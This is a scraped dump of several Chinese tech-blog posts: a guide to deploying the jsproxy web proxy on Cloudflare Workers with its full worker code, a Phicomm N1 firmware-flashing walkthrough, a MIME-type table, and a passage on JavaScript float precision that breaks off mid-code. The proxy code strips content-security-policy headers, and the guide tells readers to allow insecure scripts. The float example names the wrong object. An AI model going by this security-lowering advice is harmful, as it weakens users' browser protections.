保存并部署下，就可以查看你的服务了。 域名格式：https://自定义的名称.Cloudflare用户名.workers.dev jsproxy jsproxy 是一个基于浏览器端 JS 实现的在线代理 部署代理我们需要配合上面创建的 Cloudflare Workers 实现代理 我们需要将 jsproxy 的代码复制到 你创建的 Cloudflare Workers 的 script 里，然后保存部署。 代码地址：https://github.com/EtherDream/jsproxy/blob/master/cf-worker/index.js （文章下面有代码备份） 预览下： 自定义域名如果使用自定义域名，需要配置一个域名CNAME解析绑定：xxx.workers.dev，并开启CDN，即点亮黄云图标 最后：浏览网站的时候，有时候会提示加载不安全脚本，点击允许即可！另外jsproxy也可以使用github pages实现在线代理，这里不多介绍。 代码备份123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290'use strict'/** * static files (404.html, sw.js, conf.js) */const ASSET_URL = 'https://etherdream.github.io/jsproxy'const JS_VER = 10const MAX_RETRY = 1/** @type &#123;RequestInit&#125; */const PREFLIGHT_INIT = &#123; status: 204, headers: new Headers(&#123; 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS', 'access-control-max-age': '1728000', &#125;),&#125;/** * @param &#123;any&#125; body * @param &#123;number&#125; status * @param &#123;Object&lt;string, string&gt;&#125; headers */function makeRes(body, status = 200, headers = &#123;&#125;) &#123; headers['--ver'] = JS_VER headers['access-control-allow-origin'] = '*' return new Response(body, &#123;status, headers&#125;)&#125;/** * @param &#123;string&#125; urlStr */function newUrl(urlStr) &#123; try &#123; return new URL(urlStr) &#125; catch (err) &#123; return null &#125;&#125;addEventListener('fetch', e =&gt; &#123; const ret = fetchHandler(e) .catch(err =&gt; makeRes('cfworker error:\\n' + err.stack, 502)) e.respondWith(ret)&#125;)/** * @param &#123;FetchEvent&#125; e */async function fetchHandler(e) &#123; const req = e.request const urlStr = req.url const urlObj = new URL(urlStr) const path = urlObj.href.substr(urlObj.origin.length) if (urlObj.protocol === 'http:') &#123; urlObj.protocol = 'https:' return makeRes('', 301, &#123; 'strict-transport-security': 'max-age=99999999; includeSubDomains; preload', 'location': urlObj.href, &#125;) &#125; if (path.startsWith('/http/')) &#123; return httpHandler(req, path.substr(6)) &#125; switch (path) &#123; case '/http': return makeRes('请更新 cfworker 到最新版本!') case '/ws': return makeRes('not support', 400) case '/works': return makeRes('it works') default: // static files return fetch(ASSET_URL + path) &#125;&#125;/** * @param &#123;Request&#125; req * @param &#123;string&#125; pathname */function httpHandler(req, pathname) &#123; const reqHdrRaw = req.headers if (reqHdrRaw.has('x-jsproxy')) &#123; return Response.error() &#125; // preflight if (req.method === 'OPTIONS' &amp;&amp; reqHdrRaw.has('access-control-request-headers') ) &#123; return new Response(null, PREFLIGHT_INIT) &#125; let acehOld = false let rawSvr = '' let rawLen = '' let rawEtag = '' const reqHdrNew = new Headers(reqHdrRaw) reqHdrNew.set('x-jsproxy', '1') // 此处逻辑和 http-dec-req-hdr.lua 大致相同 // https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua const refer = reqHdrNew.get('referer') const query = refer.substr(refer.indexOf('?') + 1) if (!query) &#123; return makeRes('missing params', 403) &#125; const param = new URLSearchParams(query) for (const [k, v] of Object.entries(param)) &#123; if (k.substr(0, 2) === '--') &#123; // 系统信息 switch (k.substr(2)) &#123; case 'aceh': acehOld = true break case 'raw-info': [rawSvr, rawLen, rawEtag] = v.split('|') break &#125; &#125; else &#123; // 还原 HTTP 请求头 if (v) &#123; reqHdrNew.set(k, v) &#125; else &#123; reqHdrNew.delete(k) &#125; &#125; &#125; if (!param.has('referer')) &#123; reqHdrNew.delete('referer') &#125; // cfworker 会把路径中的 `//` 合并成 `/` const urlStr = pathname.replace(/^(https?):\\/+/, '$1://') const urlObj = newUrl(urlStr) if (!urlObj) &#123; return makeRes('invalid proxy url: ' + urlStr, 403) &#125; /** @type &#123;RequestInit&#125; */ const reqInit = &#123; method: req.method, headers: reqHdrNew, redirect: 'manual', &#125; if (req.method === 'POST') &#123; reqInit.body = req.body &#125; return proxy(urlObj, reqInit, acehOld, rawLen, 0)&#125;/** * * @param &#123;URL&#125; urlObj * @param &#123;RequestInit&#125; reqInit * @param &#123;number&#125; retryTimes */async function proxy(urlObj, reqInit, acehOld, rawLen, retryTimes) &#123; const res = await fetch(urlObj.href, reqInit) const resHdrOld = res.headers const resHdrNew = new Headers(resHdrOld) let expose = '*' for (const [k, v] of resHdrOld.entries()) &#123; if (k === 'access-control-allow-origin' || k === 'access-control-expose-headers' || k === 'location' || k === 'set-cookie' ) &#123; const x = '--' + k resHdrNew.set(x, v) if (acehOld) &#123; expose = expose + ',' + x &#125; resHdrNew.delete(k) &#125; else if (acehOld &amp;&amp; k !== 'cache-control' &amp;&amp; k !== 'content-language' &amp;&amp; k !== 'content-type' &amp;&amp; k !== 'expires' &amp;&amp; k !== 'last-modified' &amp;&amp; k !== 'pragma' ) &#123; expose = expose + ',' + k &#125; &#125; if (acehOld) &#123; expose = expose + ',--s' resHdrNew.set('--t', '1') &#125; // verify if (rawLen) &#123; const newLen = resHdrOld.get('content-length') || '' const badLen = (rawLen !== newLen) if (badLen) &#123; if (retryTimes &lt; MAX_RETRY) &#123; urlObj = await parseYtVideoRedir(urlObj, newLen, res) if (urlObj) &#123; return proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + 1) &#125; &#125; return makeRes(res.body, 400, &#123; '--error': `bad len: $&#123;newLen&#125;, except: $&#123;rawLen&#125;`, 'access-control-expose-headers': '--error', &#125;) &#125; if (retryTimes &gt; 1) &#123; resHdrNew.set('--retry', retryTimes) &#125; &#125; let status = res.status resHdrNew.set('access-control-expose-headers', expose) resHdrNew.set('access-control-allow-origin', '*') resHdrNew.set('--s', status) resHdrNew.set('--ver', JS_VER) resHdrNew.delete('content-security-policy') resHdrNew.delete('content-security-policy-report-only') resHdrNew.delete('clear-site-data') if (status === 301 || status === 302 || status === 303 || status === 307 || status === 308 ) &#123; status = status + 10 &#125; return new Response(res.body, &#123; status, headers: resHdrNew, &#125;)&#125;/** * @param &#123;URL&#125; urlObj */function isYtUrl(urlObj) &#123; return ( urlObj.host.endsWith('.googlevideo.com') &amp;&amp; urlObj.pathname.startsWith('/videoplayback') )&#125;/** * @param &#123;URL&#125; urlObj * @param &#123;number&#125; newLen * @param &#123;Response&#125; res */async function parseYtVideoRedir(urlObj, newLen, res) &#123; if (newLen &gt; 2000) &#123; return null &#125; if (!isYtUrl(urlObj)) &#123; return null &#125; try &#123; const data = await res.text() urlObj = new URL(data) &#125; catch (err) &#123; return null &#125; if (!isYtUrl(urlObj)) &#123; return null &#125; return urlObj&#125;","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"CloudFlare Worker","slug":"CloudFlare-Worker","permalink":"//www.shen.ee/tags/CloudFlare-Worker/"},{"name":"JSProxy","slug":"JSProxy","permalink":"//www.shen.ee/tags/JSProxy/"},{"name":"javascript","slug":"javascript","permalink":"//www.shen.ee/tags/javascript/"},{"name":"在线代理","slug":"在线代理","permalink":"//www.shen.ee/tags/在线代理/"},{"name":"网页代理","slug":"网页代理","permalink":"//www.shen.ee/tags/网页代理/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"斐讯N1折腾记，刷入电视盒子固件","slug":"斐讯N1折腾记，刷入电视盒子固件","date":"2019-11-02T05:50:05.000Z","updated":"2021-11-15T07:55:36.546Z","comments":true,"path":"article/16336.html","link":"","permalink":"//www.shen.ee/article/16336.html","excerpt":"","text":"​ “电视盒子哪家强？” ​ “别问，问就是N1。” 和昨天在东哥家抢到的4K显示器简直绝配，先来个全家福吧（原图） ps：忽略 IN糖 的不搭颜色，毕竟我的显示器没有内置音响（qiong~），况且这是今年双十一限量色呢！ 购买开箱 由于去年斐讯0元购暴雷，其所有产品已经被主流电商全面封杀。就连咸鱼等这些二手平台也屏蔽掉了关键字。 “主流平台既然没有，那上非主流的不就行了？” ——于是年轻人第一次安装了拼多多。 拼多多也是鱼龙混杂，有刷好各种固件的二手机子，也有自称的全新未拆封等等。 我直接买的全新未拆封N1+T1遥控器+双公头的USB线套装，最后用券到手151。 机器sn码与外包装一致，盒子K码未刮，也没有指纹， 应该算是安全下车吧 拆箱过程略，内容清单： T1遥控器 x 1; 双公头的USB线 x 1; N1盒子 x 1； 电源 x 1； 说明书+废纸片。 渣渣手机渣渣像素，就从官网拿个图吧 斐讯N1在电视盒子这个充满歪瓜裂枣的领域，就是毫无悬念的颜值担当。 ——虽然它原本不是电视盒子。 背部接口也很丰富： 电源接口 x 1； 千兆网口 x 1； HDMI x 1； USB x 2。 所以说N1真的是超有性价比。 刷个机吧需要具备一定的动手能力 材料准备 电脑; 有线鼠标 x 1; HDMI线 x 1; 网线 x 1; 双公头的USB线 x 1; 带HDMI接口的显示器/电视 x 1。 固件选择注意： 斐讯N1盒子的所有固件都是由斐讯官方固件修改而来。 主流固件： webpad固件 基于官方固件 v2.32 版修改，是其它所有第三方固件的“爸爸”; 此版本够精简开机速度够快，兼容第三方蓝牙遥控使用; 自带root，不带root管理，但可以删除内置App; 个人建议： 无论是用来做电视盒子还是 Linux 等系统，都先刷官改。 YYF固件 基于webpad旧版固件（对应官方固件 v2.19 版）的精简修改+扩展版; 自带root，自带root管理，移除了所有webpad固件内置垃圾app，加了很多实用功能，如语音控制/远程管理/bt下载之类。 … 由于N1的生态过于庞大，就不一一列出所有固件了。（我就是不想写了…） 因为我只有一台显示器且主要用来做笔记本电脑扩展显示器，所以就不折腾那么多了，刷个官改就够了。 版本降级新的机子系统版本在 V2.19 以上的都必须先降级才能刷机，降级的方法网上有很多，基本大同小异。 ①. 首先把 N1 通过网线连接到路由器上（由于我是合租路由器在客厅，你们能想象我把所有东西捣鼓到客厅的那个画面么？辛酸） ②. 然后把 N1 通过 HDMI 线连接到显示器，接通电源，机子启动，出现如下界面， 会显示系统版本和 IP 地址。 ③. 插入鼠标， 在固件版本那里连续点击 4 次，打开 adb。 这里建议插入最靠边的那个 USB 口，剩下的那个 USB 口一会还有其他用。 ④. 降级。我这用的是 webpad 大神的 《斐讯 T1、N1 官方系统降级工具》 一键操作，不用自己再手动敲入cmd命令了。电脑端运行 onekey 子目录下的 run.bat 工具。 N1 选择 2，输入 N1 的 IP 地址按照提示一步步来，降级成功会重启机子。 注意机子的系统版本虽然没有改变，实则已经降级了，不管它就好。 刷入官改①. 用USB双公头线连接盒子和电脑，这里一定要连接盒子靠近 HDMI 接口的那个 USB 口。 ②. 安装 USB_Burning_Tool 这个烧录软件，注意会提示安装驱动，一定要安装这个驱动。如果安装驱动失败，也可以手动添加驱动：打开设备管理器 =&gt; 随便点击一个硬件设备 =&gt; 添加过时硬件 =&gt; 选择 libusb-win32 Usb Devices =&gt; 点击下一步 =&gt; 选择 WorldCup Device 就安装成功了。 ③. 打开 《斐讯 T1、N1 官方系统降级工具》 选择 3 进入线刷模式，这个时候机子会重启。 ④. 在 USB_Burning_Tool 软件中，导入烧录包等待固件校验完毕，记得取消右边的 【擦除 flash】和【擦除 bootloader】选项 。 ⑤. 然后点击开始，这个时候会自动发现设备进行烧录，如果没有发现设备，请重复执行步骤③。 ⑥. 烧录完成后， 先点击停止，然后关闭软件，拔出 USB 线，拔出 N1 电源线，重新通电重启，刷机成功。 注意事项其实刷机很简单，就是有些小细节需要注意就行了。 有线鼠标，接入N1盒子最靠边的USB； 准备一条双公头USB数据线，接入电脑与N1盒子HDMI接口旁的USB； 刷机时最好将N1盒子用HDMI连接电视/显示器； 刷机时务必用网线连接N1盒子与路由器。 遥控选择总不能一直用鼠标操作把？斐讯N1官方标配是不带遥控器的，所以这里有三个选择。 T1遥控器 完美开关N1， 并且配合YYF固件可以使用语音 第三方遥控器 蓝牙遥控器基本上都支持 斐讯遥控器 APP 下载地址： https://phicloudsym.phicomm.com/ota/service/app/downloadpage?appid=2017060031&amp;channel=1PTR 备用下载： https://cloud.189.cn/t/vUZ3UnJfYJvy 密码：b8r7 工具下载文中所用到的工具下载地址： https://cloud.189.cn/t/ARrMnqvuQb2a 密码： n1zd 来个总结斐讯 N1 作为一款原本用来挖矿的“灵车”硬件，却凭借优秀性能+丰富接口+低廉价格，以电视盒子的身份迎来第二春。 还有千兆路由器 K2P，能折腾的(刷固件)生态都越来越大，我给朋友推荐路由器也是首推 K2P。 前两月的时候斐讯全新未拆封才卖70左右，如今涨到130左右，我买的是套装才是160，不要搞混了。果然斐讯的遗产保值率一直很高，甚至越来越贵，毕竟买一个是真的少一个。 另外 N1 的玩法不止这么简单，你可以用来做Linux小型服务器、NAS、游戏主机等等。 这里有网友总结的玩法大全： N1从入门到精通 这真的是把 N1 完成了树莓派。 最后最后，再次给 N1 个赞，拜了个拜！","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[{"name":"斐讯N1","slug":"斐讯N1","permalink":"//www.shen.ee/tags/斐讯N1/"},{"name":"斐讯T1","slug":"斐讯T1","permalink":"//www.shen.ee/tags/斐讯T1/"},{"name":"电视盒子","slug":"电视盒子","permalink":"//www.shen.ee/tags/电视盒子/"},{"name":"N1电视盒子","slug":"N1电视盒子","permalink":"//www.shen.ee/tags/N1电视盒子/"},{"name":"斐讯盒子","slug":"斐讯盒子","permalink":"//www.shen.ee/tags/斐讯盒子/"},{"name":"斐讯电视盒子","slug":"斐讯电视盒子","permalink":"//www.shen.ee/tags/斐讯电视盒子/"},{"name":"N1","slug":"N1","permalink":"//www.shen.ee/tags/N1/"},{"name":"T1","slug":"T1","permalink":"//www.shen.ee/tags/T1/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"Mime-Type对照表","slug":"MIME-Type对照表","date":"2019-09-10T03:00:32.000Z","updated":"2021-11-15T07:55:36.537Z","comments":true,"path":"article/21666.html","link":"","permalink":"//www.shen.ee/article/21666.html","excerpt":"","text":"更新 office 各种新格式文件对应的 MIME ，请按下 Ctrl+ F 搜索 文件扩展名 Content-Type(Mime-Type) 文件扩展名 Content-Type(Mime-Type) .*（ 二进制流，不知道下载文件类型） application/octet-stream .tif image/tiff .001 application/x-001 .301 application/x-301 .323 text/h323 .906 application/x-906 .907 drawing/907 .a11 application/x-a11 .acp audio/x-mei-aac .ai application/postscript .aif audio/aiff .aifc audio/aiff .aiff audio/aiff .anv application/x-anv .asa text/asa .asf video/x-ms-asf .asp text/asp .asx video/x-ms-asf .au audio/basic .avi video/avi .awf application/vnd.adobe.workflow .biz text/xml .bmp application/x-bmp .bot application/x-bot .c4t application/x-c4t .c90 application/x-c90 .cal application/x-cals .cat application/vnd.ms-pki.seccat .cdf application/x-netcdf .cdr application/x-cdr .cel application/x-cel .cer application/x-x509-ca-cert .cg4 application/x-g4 .cgm application/x-cgm .cit application/x-cit .class java/* .cml text/xml .cmp application/x-cmp .cmx application/x-cmx .cot application/x-cot .crl application/pkix-crl .crt application/x-x509-ca-cert .csi application/x-csi .css text/css .cut application/x-cut .dbf application/x-dbf .dbm application/x-dbm .dbx application/x-dbx .dcd text/xml .dcx application/x-dcx .der application/x-x509-ca-cert .dgn application/x-dgn .dib application/x-dib .dll application/x-msdownload .doc application/msword .dot application/msword .docx application/vnd.openxmlformats-officedocument.wordprocessingml.document .dotx application/vnd.openxmlformats-officedocument.wordprocessingml.template .docm application/vnd.ms-word.document.macroEnabled.12 .dotm application/vnd.ms-word.template.macroEnabled.12 .drw application/x-drw .dtd text/xml .dwf Model/vnd.dwf .dwf application/x-dwf .dwg application/x-dwg .dxb application/x-dxb .dxf application/x-dxf .edn application/vnd.adobe.edn .emf application/x-emf .eml message/rfc822 .ent text/xml .epi application/x-epi .eps application/x-ps .eps application/postscript .etd application/x-ebx .exe application/x-msdownload .fax image/fax .fdf application/vnd.fdf .fif application/fractals .fo text/xml .frm application/x-frm .g4 application/x-g4 .gbr application/x-gbr . application/x- .gif image/gif .gl2 application/x-gl2 .gp4 application/x-gp4 .hgl application/x-hgl .hmr application/x-hmr .hpg application/x-hpgl .hpl application/x-hpl .hqx application/mac-binhex40 .hrf application/x-hrf .hta application/hta .htc text/x-component .htm text/html .html text/html .htt text/webviewhtml .htx text/html .icb application/x-icb .ico image/x-icon .ico application/x-ico .iff application/x-iff .ig4 application/x-g4 .igs application/x-igs .iii application/x-iphone .img application/x-img .ins application/x-internet-signup .isp application/x-internet-signup .IVF video/x-ivf .java java/* .jfif image/jpeg .jpe image/jpeg .jpe application/x-jpe .jpeg image/jpeg .jpg image/jpeg .jpg application/x-jpg .js application/x-javascript .jsp text/html .la1 audio/x-liquid-file .lar application/x-laplayer-reg .latex application/x-latex .lavs audio/x-liquid-secure .lbm application/x-lbm .lmsff audio/x-la-lms .ls application/x-javascript .ltr application/x-ltr .m1v video/x-mpeg .m2v video/x-mpeg .m3u audio/mpegurl .m4e video/mpeg4 .mac application/x-mac .man application/x-troff-man .math text/xml .mdb application/msaccess .mdb application/x-mdb .mfp application/x-shockwave-flash .mht message/rfc822 .mhtml message/rfc822 .mi application/x-mi .mid audio/mid .midi audio/mid .mil application/x-mil .mml text/xml .mnd audio/x-musicnet-download .mns audio/x-musicnet-stream .mocha application/x-javascript .movie video/x-sgi-movie .mp1 audio/mp1 .mp2 audio/mp2 .mp2v video/mpeg .mp3 audio/mp3 .mp4 video/mpeg4 .mpa video/x-mpg .mpd application/vnd.ms-project .mpe video/x-mpeg .mpeg video/mpg .mpg video/mpg .mpga audio/rn-mpeg .mpp application/vnd.ms-project .mps video/x-mpeg .mpt application/vnd.ms-project .mpv video/mpg .mpv2 video/mpeg .mpw application/vnd.ms-project .mpx application/vnd.ms-project .mtx text/xml .mxp application/x-mmxp .net image/pnetvue .nrf application/x-nrf .nws message/rfc822 .odc text/x-ms-odc .out application/x-out .p10 application/pkcs10 .p12 application/x-pkcs12 .p7b application/x-pkcs7-certificates .p7c application/pkcs7-mime .p7m application/pkcs7-mime .p7r application/x-pkcs7-certreqresp .p7s application/pkcs7-signature .pc5 application/x-pc5 .pci application/x-pci .pcl application/x-pcl .pcx application/x-pcx .pdf application/pdf .pdf application/pdf .pdx application/vnd.adobe.pdx .pfx application/x-pkcs12 .pgl application/x-pgl .pic application/x-pic .pko application/vnd.ms-pki.pko .pl application/x-perl .plg text/html .pls audio/scpls .plt application/x-plt .png image/png .png application/x-png .pot application/vnd.ms-powerpoint .ppa application/vnd.ms-powerpoint .ppm application/x-ppm .pps application/vnd.ms-powerpoint .ppt application/vnd.ms-powerpoint .ppt application/x-ppt .pr application/x-pr .pptx application/vnd.openxmlformats-officedocument.presentationml.presentation .potx application/vnd.openxmlformats-officedocument.presentationml.template .ppsx application/vnd.openxmlformats-officedocument.presentationml.slideshow .ppam application/vnd.ms-powerpoint.addin.macroEnabled.12 .pptm application/vnd.ms-powerpoint.presentation.macroEnabled.12 .potm application/vnd.ms-powerpoint.presentation.macroEnabled.12 .ppsm application/vnd.ms-powerpoint.slideshow.macroEnabled.12 .prf application/pics-rules .prn application/x-prn .prt application/x-prt .ps application/x-ps .ps application/postscript .ptn application/x-ptn .pwz application/vnd.ms-powerpoint .r3t text/vnd.rn-realtext3d .ra audio/vnd.rn-realaudio .ram audio/x-pn-realaudio .ras application/x-ras .rat application/rat-file .rdf text/xml .rec application/vnd.rn-recording .red application/x-red .rgb application/x-rgb .rjs application/vnd.rn-realsystem-rjs .rjt application/vnd.rn-realsystem-rjt .rlc application/x-rlc .rle application/x-rle .rm application/vnd.rn-realmedia .rmf application/vnd.adobe.rmf .rmi audio/mid .rmj application/vnd.rn-realsystem-rmj .rmm audio/x-pn-realaudio .rmp application/vnd.rn-rn_music_package .rms application/vnd.rn-realmedia-secure .rmvb application/vnd.rn-realmedia-vbr .rmx application/vnd.rn-realsystem-rmx .rnx application/vnd.rn-realplayer .rp image/vnd.rn-realpix .rpm audio/x-pn-realaudio-plugin .rsml application/vnd.rn-rsml .rt text/vnd.rn-realtext .rtf application/msword .rtf application/x-rtf .rv video/vnd.rn-realvideo .sam application/x-sam .sat application/x-sat .sdp application/sdp .sdw application/x-sdw .sit application/x-stuffit .slb application/x-slb .sld application/x-sld .slk drawing/x-slk .smi application/smil .smil application/smil .smk application/x-smk .snd audio/basic .sol text/plain .sor text/plain .spc application/x-pkcs7-certificates .spl application/futuresplash .spp text/xml .ssm application/streamingmedia .sst application/vnd.ms-pki.certstore .stl application/vnd.ms-pki.stl .stm text/html .sty application/x-sty .svg text/xml .swf application/x-shockwave-flash .tdf application/x-tdf .tg4 application/x-tg4 .tga application/x-tga .tif image/tiff .tif application/x-tif .tiff image/tiff .tld text/xml .top drawing/x-top .torrent application/x-bittorrent .tsd text/xml .txt text/plain .uin application/x-icq .uls text/iuls .vcf text/x-vcard .vda application/x-vda .vdx application/vnd.visio .vml text/xml .vpg application/x-vpeg005 .vsd application/vnd.visio .vsd application/x-vsd .vss application/vnd.visio .vst application/vnd.visio .vst application/x-vst .vsw application/vnd.visio .vsx application/vnd.visio .vtx application/vnd.visio .vxml text/xml .wav audio/wav .wax audio/x-ms-wax .wb1 application/x-wb1 .wb2 application/x-wb2 .wb3 application/x-wb3 .wbmp image/vnd.wap.wbmp .wiz application/msword .wk3 application/x-wk3 .wk4 application/x-wk4 .wkq application/x-wkq .wks application/x-wks .wm video/x-ms-wm .wma audio/x-ms-wma .wmd application/x-ms-wmd .wmf application/x-wmf .wml text/vnd.wap.wml .wmv video/x-ms-wmv .wmx video/x-ms-wmx .wmz application/x-ms-wmz .wp6 application/x-wp6 .wpd application/x-wpd .wpg application/x-wpg .wpl application/vnd.ms-wpl .wq1 application/x-wq1 .wr1 application/x-wr1 .wri application/x-wri .wrk application/x-wrk .ws application/x-ws .ws2 application/x-ws .wsc text/scriptlet .wsdl text/xml .wvx video/x-ms-wvx .xdp application/vnd.adobe.xdp .xdr text/xml .xfd application/vnd.adobe.xfd .xfdf application/vnd.adobe.xfdf .xhtml text/html .xls application/vnd.ms-excel .xls application/x-xls .xlw application/x-xlw .xlt application/vnd.ms-excel .xla application/vnd.ms-excel .xlsx application/vnd.openxmlformats-officedocument.spreadsheetml.sheet .xltx application/vnd.openxmlformats-officedocument.spreadsheetml.template .xlsm application/vnd.ms-excel.sheet.macroEnabled.12 .xltm application/vnd.ms-excel.template.macroEnabled.12 .xlam application/vnd.ms-excel.addin.macroEnabled.12 .xlsb application/vnd.ms-excel.sheet.binary.macroEnabled.12 .xml text/xml .xpl audio/scpls .xq text/xml .xql text/xml .xquery text/xml .xsd text/xml .xsl text/xml .xslt text/xml .xwd application/x-xwd .x_b application/x-x_b .sis application/vnd.symbian.install .sisx application/vnd.symbian.install .x_t application/x-x_t .ipa application/vnd.iphone .apk application/vnd.android.package-archive .xap application/x-silverlight-app","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Mime-Type","slug":"Mime-Type","permalink":"//www.shen.ee/tags/Mime-Type/"},{"name":"Content-Type","slug":"Content-Type","permalink":"//www.shen.ee/tags/Content-Type/"},{"name":"http:Content-Type","slug":"http-Content-Type","permalink":"//www.shen.ee/tags/http-Content-Type/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"js运算精准问题","slug":"js运算精准问题","date":"2019-07-17T06:30:37.000Z","updated":"2021-11-15T07:55:36.541Z","comments":true,"path":"article/55210.html","link":"","permalink":"//www.shen.ee/article/55210.html","excerpt":"","text":"​ 都知道拿js去做运算肯定会遇到计算精准的问题（或称舍入误差），但是怎么避开这些坑，这里是我从网上整理的方案，欢迎探讨。 精准丢失的原因计算机的二进制实现和位数限制有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JavaScript 使用 64 位存储数字类型，因此超出的会舍去。舍去的部分就是精度丢失的部分。 以下是十进制小数对应的二进制表示 120.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环） 解决方案如需要更加复杂的计算类库，可以考虑 math.js等知名类库 浮点数（小数）对于小数，前端出现问题的几率还是很多的，尤其在一些电商网站涉及到金额等数据。解决方式：把小数放到位整数（乘倍数），再缩小回原来倍数（除倍数）转换成整数后的运算结果 不能超过 Math.pow(2,53) 12// 0.1 + 0.2(0.1*10 + 0.2*10) / 10 == 0.3 // true 浮点精准运算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115/** * floatObj 包含加减乘除四个方法，能确保浮点数运算不丢失精度 * * ** method ** * add / subtract / multiply /divide * * ** explame ** * 0.1 + 0.2 == 0.30000000000000004 （多了 0.00000000000004） * 0.2 + 0.4 == 0.6000000000000001 （多了 0.0000000000001） * 19.9 * 100 == 1989.9999999999998 （少了 0.0000000000002） * * floatObj.add(0.1, 0.2) &gt;&gt; 0.3 * floatObj.multiply(19.9, 100) &gt;&gt; 1990 * */var floatObj = function() &#123; /* * 判断obj是否为一个整数 */ function isInteger(obj) &#123; return Math.floor(obj) === obj &#125; /* * 将一个浮点数转成整数，返回整数和倍数。如 3.14 &gt;&gt; 314，倍数是 100 * @param floatNum &#123;number&#125; 小数 * @return &#123;object&#125; * &#123;times:100, num: 314&#125; */ function toInteger(floatNum) &#123; var ret = &#123;times: 1, num: 0&#125; if (isInteger(floatNum)) &#123; ret.num = floatNum return ret &#125; var strfi = floatNum + '' var dotPos = strfi.indexOf('.') var len = strfi.substr(dotPos+1).length var times = Math.pow(10, len) var intNum = parseInt(floatNum * times + 0.5, 10) ret.times = times ret.num = intNum return ret &#125; /* * 核心方法，实现加减乘除运算，确保不丢失精度 * 思路：把小数放大为整数（乘），进行算术运算，再缩小为小数（除） * * @param a &#123;number&#125; 运算数1 * @param b &#123;number&#125; 运算数2 * @param digits &#123;number&#125; 精度，保留的小数点数，比如 2, 即保留为两位小数 * @param op &#123;string&#125; 运算类型，有加减乘除（add/subtract/multiply/divide） * */ function operation(a, b, digits, op) &#123; var o1 = toInteger(a) var o2 = toInteger(b) var n1 = o1.num var n2 = o2.num var t1 = o1.times var t2 = o2.times var max = t1 &gt; t2 ? t1 : t2 var result = null switch (op) &#123; case 'add': if (t1 === t2) &#123; // 两个小数位数相同 result = n1 + n2 &#125; else if (t1 &gt; t2) &#123; // o1 小数位 大于 o2 result = n1 + n2 * (t1 / t2) &#125; else &#123; // o1 小数位 小于 o2 result = n1 * (t2 / t1) + n2 &#125; return result / max case 'subtract': if (t1 === t2) &#123; result = n1 - n2 &#125; else if (t1 &gt; t2) &#123; result = n1 - n2 * (t1 / t2) &#125; else &#123; result = n1 * (t2 / t1) - n2 &#125; return result / max case 'multiply': result = (n1 * n2) / (t1 * t2) return result case 'divide': result = (n1 / n2) * (t2 / t1) return result &#125; &#125; // 加减乘除的四个接口 function add(a, b, digits) &#123; return operation(a, b, digits, 'add') &#125; function subtract(a, b, digits) &#123; return operation(a, b, digits, 'subtract') &#125; function multiply(a, b, digits) &#123; return operation(a, b, digits, 'multiply') &#125; function divide(a, b, digits) &#123; return operation(a, b, digits, 'divide') &#125; // exports return &#123; add: add, subtract: subtract, multiply: multiply, divide: divide &#125;&#125;(); 使用方法： 1234floatTool.add(a,b);//相加floatTool.subtract(a,b);//相减floatTool.multiply(a,b);//相乘floatTool.divide(a,b);//相除 超大整数虽然运算结果不超过Math.pow(2,53)的整数（9007199254740992）也可以使用上面的方法，但是如果就是有超过的呢，实际场景中可能会是一些批次号、号段之类的需求，这里我也找到了一个解决方案，直接上代码。 在线运算：https://www.shen.ee/math.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275function compare(p, q) &#123; while (p[0] === '0') &#123; p = p.substr(1); &#125; while (q[0] === '0') &#123; q = q.substr(1); &#125; if (p.length &gt; q.length) &#123; return 1; &#125; else if (p.length &lt; q.length) &#123; return -1; &#125; else &#123; let i = 0; let a, b; while (1) &#123; a = parseInt(p.charAt(i)); b = parseInt(q.charAt(i)); if (a &gt; b) &#123; return 1; &#125; else if (a &lt; b) &#123; return -1; &#125; else if (i === p.length - 1) &#123; return 0; &#125; i++; &#125; &#125;&#125;function divide(A, B) &#123; let result = []; let max = 9; let point = 5; let fill = 0; if (B.length - A.length &gt; 0) &#123; point += fill = B.length - A.length; &#125; for (let i = 0; i &lt; point; i++) &#123; A += '0'; &#125; let la = A.length; let lb = B.length; let b0 = parseInt(B.charAt(0)); let Adb = A.substr(0, lb); A = A.substr(lb); let temp, r; for (let j = 0; j &lt; la - lb + 1; j++) &#123; while (Adb[0] === '0') &#123; Adb = Adb.substr(1); &#125; if (Adb.length === lb) &#123; max = Math.ceil((parseInt(Adb.charAt(0)) + 1) / b0); // 不可能取到这个最大值,1&lt;= max &lt;= 10 &#125; else if (Adb.length &gt; lb) 